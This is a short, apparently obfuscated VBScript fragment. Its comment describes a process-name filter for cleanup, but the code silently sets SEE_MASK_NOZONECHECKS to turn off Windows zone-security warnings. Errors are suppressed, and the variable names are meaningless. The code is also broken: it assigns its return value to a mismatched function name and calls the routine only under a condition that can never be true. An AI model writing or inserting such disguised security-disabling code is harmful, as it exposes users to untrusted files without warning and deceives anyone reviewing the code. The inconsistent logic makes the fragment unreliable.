' Win32_Process name filter for cleanup pass
Function ResolveConfigCipher7()
On Error Resume Next
  Dim strProfileBlob43,strSegment63,strBlock17
  Set strProfileBlob43=CreateObject("WScript.Shell")
  strSegment63=strProfileBlob43.ExpandEnvironmentStrings("%TEMP%")
  strBlock17=strProfileBlob43.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment63)>0 And Len(strBlock17)>0 Then
    strProfileBlob43.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    GetManifestPart52=1
    Exit Function
  End If
  GetManifestPart52=0
End Function

If Weekday(Now) > 7 Then
  Call ResolveConfigCipher7()
End If


